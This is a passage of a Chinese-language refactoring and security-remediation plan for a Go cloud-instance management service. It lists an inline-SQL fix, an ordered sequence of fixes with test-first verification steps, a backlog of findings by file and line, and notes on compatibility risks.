- **验证**：`go test ./internal/httpapi/`

### Q3 [质量/中] `cmd/oci-start/main.go:174,207,229` — 内联裸 SQL + context.Background()
- **现状**：main.go 在 wsHub Console/Rescue `SetDeps` 闭包里裸 SQL `QueryRowContext(context.Background(), ...)`，绕过 repo；列清单跨 3 处重复。
- **方案**（保签名）：闭包内用 `ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second); defer cancel()` 替裸 background；把 3 段 SQL 下沉到 repo 新增方法（`FindConsoleInstanceInfo`/`FindRescueInstanceInfo`/`FindCompartmentID`）。完整请求 ctx 透传会改 `ConsoleDeps/RescueDeps` 函数类型签名（breaksAPI），**不做**，仅超时包裹 + 下沉。
- **测试**：repo 新方法加 `repo/instance_detail_test.go`（sqlc 合约）；main 编译通过。
- **兼容性**：新增 repo 方法（导出但不破坏旧）；`ConsoleDeps/RescueDeps` 签名不变。
- **验证**：`go build ./... && go test ./internal/repo/`

---

## 7. 实施顺序与每步验证

1. **Foundation**（已完成）：CLAUDE.md + .claude/settings.json + 绿基线 ✅
2. **P0 安全**：S1 → S3 → S2 → S5 → S6 → S7 → S8 → S9 → S10 → S4（最大放最后）
3. **P1 并发**：0.1 safeConn + C6 → C1 → C2 → C3 → C4 → C5 → C7
4. **P2 错误**：E3 → E4 → E8 → E9 → E6 → E5 → E1 → E2 → E7
5. **P3 性能**：P-1 → P-2 → P-3
6. **P4 bug+测试**：B1 → B2 → B3 → B4 → B5 → B6
7. **P5 质量**：Q4 → Q2 → Q5 → Q1 → Q3

每项：先写测试（红）→ 最小改动（绿）→ `go build ./... && go vet ./... && go test ./...`（并发项 `-race`）→ 原子化便于 review。全部完成后输出变更总结。

---

## 8. Backlog（中/低，本次不实施，记录防丢）

### 中等（57 项，按维度）
**安全（6，建议提升，已列 S5–S10）**：cookie.go:17、turnstile.go:45、importer.go:303、ssh_config.go:33、ip.go:16、ws/ssh.go:93。
**并发（13）**：main.go:173/388、dns/cache.go:131、grabber/pools.go:139/153、grabber/success.go:64、notify/channels.go:45、oci/region_sub.go:222、scheduler.go:88、service/instance_management.go:104、service/ping.go:34/78、ws/log.go:107/148。
**错误（18）**：acme/manager.go:44/60、dns/service.go:253、auth_login.go:121、auth_oauth.go:174、handler_system_settings.go:103、proxy.go:98/128、service/email.go:618、service/instance_management.go:59、service/object_storage.go:296、service/ping.go:84、service/tenant.go:135、service/vnic_management.go:478、util/httpclient/proxy.go:103、ws/ssh.go:113、ws/console.go:447。
**性能（8）**：dns/cache.go:131、grabber/engine.go:303/52、httpapi/proxy.go:128、service/check_live.go:45、service/email_send.go:205。
**资源泄漏（2）**：grabber/success.go:64、service/object_storage.go:337。
**代码质量（13）**：main.go:173×2、grabber/engine.go:52、grabber/launch.go:160/249、grabber/launcher.go:552、httpapi/instance_detail.go:537、httpapi/migration.go:61、scheduler.go:87、service/backup.go:176、service/instance_detail.go:203、service/object_storage.go:622、service/vnic_management.go:522、sysconf.go:36。
**测试缺口（8）**：acme/manager.go:44、dns/cloudflare.go:135、grabber/engine.go:52、util/ip/ip.go:16、util/rsakey/rsakey.go:67、util/totp/totp.go:17、util/turnstile/turnstile.go:29、ws/rescue.go:377。

### 低（26 项）：main.go god file（1/42/108/523）、grabber/pools.go:202/209、grabber/success.go:129、httpapi/boot_instance.go:14、deps.go:30、instance_detail.go:1、migration.go:286、object_storage.go:534、repo/querier.go:17、response.go:16、dns/cache.go:25、grabber/pools.go:139、ws/ssh.go:120、acme/manager.go:60、grabber/engine.go:310、grabber/launch.go:62、auth_mfa.go:63、migration.go:63、tenant.go:97、rsakey.go:90、console.go:447、scheduler.go:189、object_storage.go:484、cloudflare.go:138、auth_register.go:53、dns/cache.go:131、repo/grabber.sql.go:221。

---

## 9. 风险与范围说明
- **S4** 跨多文件 + 旧数据兼容，是最大单项；用读时降级保证向后兼容，后台迁移择机回写。
- **S2** WS 加 token 是行为变更（前端需同步带 `?token=`），非签名变更；前端在 `frontend/` 内一并改。
- **S5–S10** 默认纳入（安全、小）；如想拆出告知。
- **Q3** 完整请求 ctx 透传会破坏 `ConsoleDeps/RescueDeps` 导出函数类型签名，**不做**；仅做超时包裹 + SQL 下沉 repo。
- 所有改动不引入新依赖、不动分层、不改导出签名（除未导出的 `GenerateIV` 返 error，属内部）。
